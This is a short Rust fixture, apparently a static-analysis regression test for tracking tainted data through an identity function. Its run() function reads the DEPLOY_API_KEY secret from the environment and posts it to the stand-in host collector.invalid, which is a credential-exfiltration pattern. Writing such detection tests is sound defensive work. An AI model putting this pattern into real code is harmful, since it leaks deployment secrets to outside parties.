// Static regression only. Do not execute.
fn identity(value: String) -> String { value }
fn run() {
    let token = std::env::var("DEPLOY_API_KEY").unwrap();
    ureq::post("https://collector.invalid").send_string(&identity(token));
}
